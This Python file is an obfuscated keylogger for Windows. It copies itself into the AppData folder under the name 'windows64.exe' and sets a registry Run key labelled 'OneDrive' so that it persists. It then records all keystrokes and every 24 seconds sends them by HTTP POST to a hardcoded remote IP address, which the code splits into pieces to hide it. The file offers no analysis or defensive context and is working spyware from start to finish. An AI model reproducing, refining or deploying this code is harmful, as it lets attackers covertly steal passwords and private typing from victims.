from pynput import keyboard #line:1:from pynput import keyboard
import requests #line:2:import requests
import shutil #line:3:import shutil
import subprocess #line:4:import subprocess
import json #line:5:import json
import threading #line:6:import threading
import socket #line:7:import socket
import platform #line:8:import platform
import base64 #line:9:import base64
import sys #line:10:import sys
import os #line:11:import os
import time #line:12:import time
text =""#line:13:text = ""
ip ="35.1"#line:15:ip = "35.1"
add ="68.1"#line:16:add = "68.1"
ress ="37.29"#line:17:ress = "37.29"
port_number ="8080"#line:18:port_number = "8080"
ip_address =ip +add +ress #line:19:ip_address = ip + add + ress
time_interval =24 #line:21:time_interval = 24
def pxsehdxexiwh ():#line:23:def pxsehdxexiwh():
    O00OOO00O0O000000 =os .environ ['appdata']+'\\windows64.exe'#line:24:location = os.environ['appdata'] + '\\windows64.exe'
    shutil .copyfile (sys .executable ,O00OOO00O0O000000 )#line:25:shutil.copyfile(sys.executable,location)
    subprocess .call ('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDrive /t REG_SZ /d "'+O00OOO00O0O000000 +'"',shell =True )#line:26:subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDrive /t REG_SZ /d "' + location + '"', shell=True)
pxsehdxexiwh ()#line:28:pxsehdxexiwh()
def send_post_req ():#line:30:def send_post_req():
    try :#line:31:try:
        OOOO0OO0O0O000O0O =json .dumps ({"keyboardData":text })#line:32:payload = json.dumps({"keyboardData" : text})
        O000OO0OO0O00O0O0 =requests .post (f"http://{ip_address}:{port_number}",data =OOOO0OO0O0O000O0O ,headers ={"Content-Type":"application/json"})#line:34:data = payload, headers={"Content-Type" : "application/json"})
        OOO0OO00O000O0000 =threading .Timer (time_interval ,send_post_req )#line:35:timer = threading.Timer(time_interval, send_post_req)
        OOOO0OO0O0O000O0O ="<br><br><p><p>"#line:36:payload = "<br><br><p><p>"
        OOO0OO00O000O0000 .start ()#line:37:timer.start()
    except :#line:38:except:
        print ("Couldn't complete request!")#line:39:print("Couldn't complete request!")
def on_press (O0O0O0OOO000000O0 ):#line:41:def on_press(key):
    global text #line:42:global text
    if O0O0O0OOO000000O0 ==keyboard .Key .enter :#line:44:if key == keyboard.Key.enter:
        text +="[enter]"#line:45:text += "[enter]"
    elif O0O0O0OOO000000O0 ==keyboard .Key .tab :#line:46:elif key == keyboard.Key.tab:
        text +="[tab]"#line:47:text += "[tab]"
    elif O0O0O0OOO000000O0 ==keyboard .Key .space :#line:48:elif key == keyboard.Key.space:
        text +="[space]"#line:49:text += "[space]"
    elif O0O0O0OOO000000O0 ==keyboard .Key .shift :#line:50:elif key == keyboard.Key.shift:
        text +="[shift]"#line:51:text += "[shift]"
    elif O0O0O0OOO000000O0 ==keyboard .Key .backspace :#line:52:elif key == keyboard.Key.backspace:
         text +="[<-]"#line:53:text += "[<-]"
    elif O0O0O0OOO000000O0 ==keyboard .Key .ctrl_l or O0O0O0OOO000000O0 ==keyboard .Key .ctrl_r :#line:54:elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
         text +="[control]"#line:55:text += "[control]"
    elif O0O0O0OOO000000O0 ==keyboard .Key .esc :#line:56:elif key == keyboard.Key.esc:
         text +="[escape]"#line:57:text += "[escape]"
    else :#line:58:else:
        text +=str (O0O0O0OOO000000O0 ).strip ("'")#line:59:text += str(key).strip("'")
with keyboard .Listener (on_press =on_press )as listener :#line:62:on_press=on_press) as listener:
    send_post_req ()#line:63:send_post_req()
    listener .join ()
